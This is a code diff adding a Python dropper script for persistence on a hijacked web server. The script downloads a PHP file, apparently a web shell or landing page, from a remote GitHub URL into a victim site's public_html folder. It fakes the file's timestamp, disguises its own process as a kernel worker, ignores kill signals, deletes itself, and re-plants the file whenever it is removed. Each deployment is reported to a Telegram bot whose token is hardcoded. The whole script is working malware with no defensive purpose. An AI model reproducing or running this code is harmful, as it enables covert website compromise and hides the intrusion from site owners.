@@ -1,0 +1,182 @@
+#!/usr/bin/env python3
+import os
+import time
+import sys
+import signal
+import urllib.request
+import urllib.parse
+import subprocess
+import hashlib
+from datetime import datetime
+
+CONFIG = {
+    "RAW_SHELL_URL": "https://raw.githubusercontent.com/la-inca/clev/refs/heads/main/parasitetesting.txt",
+    "BOT_TOKEN": os.getenv("BOT_TOKEN", "8559074485:AAGMwVw5bm-RNvckM4_F5vbU0Gijy7FKtwo"),
+    "CHAT_ID": os.getenv("CHAT_ID", "-1003217853706"),
+    "TARGET_DIR": "/mnt/BLOCKSTORAGE/home/229160.cloudwaysapps.com/erwfufpvdy/public_html/public/mics",
+    "FILE_NAME": "Babesiosis.php",
+    "TIMESTAMP": "201611081531.12",
+    "TIMEOUT": 10,
+    "POLL_INTERVAL": 2
+}
+
+TARGET_DIR = os.path.abspath(CONFIG["TARGET_DIR"])
+FILE_PATH = os.path.join(TARGET_DIR, CONFIG["FILE_NAME"])
+SELF_PATH = os.path.abspath(__file__)
+
+current_file_hash = None
+domain = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "https://parasitetesting.com/mics"
+redeploy_cooldown = 10
+
+try:
+    os.nice(19)
+    os.execl(sys.executable, "[kworker/0:1]", *sys.argv)
+except:
+    pass
+sys.argv[0] = "[kworker/0:1]"
+
+def ignore_signal(signum, frame):
+    pass
+
+for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP, signal.SIGQUIT, signal.SIGTSTP]:
+    try:
+        signal.signal(sig, ignore_signal)
+    except:
+        pass
+
+def kirim_telegram(message):
+    url = f"https://api.telegram.org/bot{CONFIG['BOT_TOKEN']}/sendMessage"
+    data = urllib.parse.urlencode({
+        "chat_id": CONFIG["CHAT_ID"],
+        "parse_mode": "Markdown",
+        "text": message
+    }).encode('ascii')
+    try:
+        req = urllib.request.Request(url, data=data, method='POST')
+        urllib.request.urlopen(req, timeout=CONFIG["TIMEOUT"])
+    except:
+        pass
+
+def get_file_hash(path):
+    try:
+        with open(path, 'rb') as f:
+            return hashlib.sha256(f.read()).hexdigest()
+    except:
+        return None
+
+def download_with_urllib(target_path):
+    try:
+        with urllib.request.urlopen(CONFIG["RAW_SHELL_URL"], timeout=CONFIG["TIMEOUT"]) as response:
+            content = response.read()
+            os.makedirs(os.path.dirname(target_path), exist_ok=True)
+            with open(target_path, 'wb') as f:
+                f.write(content)
+        if os.path.getsize(target_path) == 0:
+            return False
+        os.chmod(target_path, 0o644)
+        return True
+    except:
+        return False
+
+def download_with_curl(target_path):
+    try:
+        os.makedirs(os.path.dirname(target_path), exist_ok=True)
+        result = subprocess.run(
+            ["curl", "-s", "-o", target_path, CONFIG["RAW_SHELL_URL"]],
+            capture_output=True, text=True, timeout=CONFIG["TIMEOUT"]
+        )
+        if result.returncode == 0 and os.path.getsize(target_path) > 0:
+            os.chmod(target_path, 0o644)
+            return True
+        return False
+    except:
+        return False
+
+def download_file(target_path):
+    if download_with_urllib(target_path):
+        return True
+    return download_with_curl(target_path)
+
+def parse_config_timestamp(ts_str):
+    patterns = [
+        "%Y-%m-%d %H:%M:%S",
+        "%Y%m%d%H%M.%S",
+        "%Y%m%d%H%M%S",
+        "%Y-%m-%dT%H:%M:%S"
+    ]
+    for p in patterns:
+        try:
+            return datetime.strptime(ts_str, p)
+        except:
+            continue
+    try:
+        if ts_str.isdigit():
+            return datetime.fromtimestamp(int(ts_str))
+    except:
+        pass
+    return datetime.now()
+
+def auto_touch(path, dt_obj):
+    try:
+        ts = dt_obj.timestamp()
+        os.utime(path, (ts, ts))
+    except:
+        pass
+
+def ensure_target_dir():
+    try:
+        os.makedirs(TARGET_DIR, exist_ok=True)
+        return True
+    except:
+        return False
+
+def check_file_changes():
+    global current_file_hash
+    exists = os.path.exists(FILE_PATH)
+    file_hash = get_file_hash(FILE_PATH) if exists else None
+    if not exists:
+        deploy_file()
+    elif file_hash != current_file_hash:
+        deploy_file()
+
+def deploy_file():
+    global current_file_hash
+    if not ensure_target_dir():
+        kirim_telegram(f"⚠️ Gagal membuat folder target: `{TARGET_DIR}`")
+        return
+    if download_file(FILE_PATH):
+        current_file_hash = get_file_hash(FILE_PATH)
+        relative = os.path.basename(FILE_PATH)
+        url = f"{domain}/{relative}"
+        dt = parse_config_timestamp(CONFIG.get("TIMESTAMP", ""))
+        human_ts = dt.strftime('%Y-%m-%d %H:%M:%S')
+        kirim_telegram(f"""✅ *LP berhasil dideploy!*
+📁 Path: `{FILE_PATH}`
+🌍 URL: `{url}`
+🕒 Waktu: {human_ts}""")
+        auto_touch(FILE_PATH, dt)
+
+def self_destruct():
+    try:
+        with open(SELF_PATH, 'a'):
+            pass
+        subprocess.run(["rm", "-f", SELF_PATH], timeout=2)
+    except:
+        pass
+
+def main():
+    if not domain:
+        self_destruct()
+        return
+    self_destruct()
+    ensure_target_dir()
+    deploy_file()
+    while True:
+        check_file_changes()
+        time.sleep(CONFIG["POLL_INTERVAL"])
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        self_destruct()
